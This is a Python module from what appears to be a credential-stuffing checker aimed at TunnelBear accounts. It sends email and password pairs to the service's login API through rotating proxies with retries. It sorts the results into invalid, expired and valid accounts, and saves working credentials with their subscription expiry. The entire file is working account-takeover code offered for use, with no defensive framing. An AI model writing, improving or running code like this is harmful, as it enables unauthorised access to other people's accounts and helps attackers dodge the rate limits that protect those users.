from modules.variables import Checker
from modules.functions import bad_proxy, log, return_proxy,save,set_proxy
from requests import Session
from datetime import datetime
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)
            
            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                data = {'username':email,'password':password,'withUserDetails':True,'v':'web-1.0'}
                headers = {"Content-Type":"application/x-www-form-urlencoded"}
                
                response = s.post("https://www.tunnelbear.com/core/api/login",data=data,headers=headers)
                if response.status_code == 403 or "Access denied" in response.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif '{"result":"PASS"' not in response.text:
                    raise
                
                expiry = response.json()["details"]["fullVersionUntil"]
                expire = int(datetime.strptime(response.json()["details"]["fullVersionUntil"], '%b %d, %Y %H:%M:%S %p').date().strftime("%Y%m%d"))
                now = int(datetime.now().strftime("%Y%m%d"))
                if now > expire:
                    Checker.custom += 1
                    return_proxy(proxy)
                    if not Checker.cui: log("custom",":".join([email,password]),"Tunnelbear")
                    save("Tunnelbear","custom",Checker.time,":".join([email,password]))
                    return
                else:
                    Checker.good += 1
                    return_proxy(proxy)
                    if not Checker.cui: log("good",":".join([email,password]),"Tunnelbear")
                    save("Tunnelbear","good",Checker.time,":".join([email,password])+f" | Expire: {expiry}")
                    return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        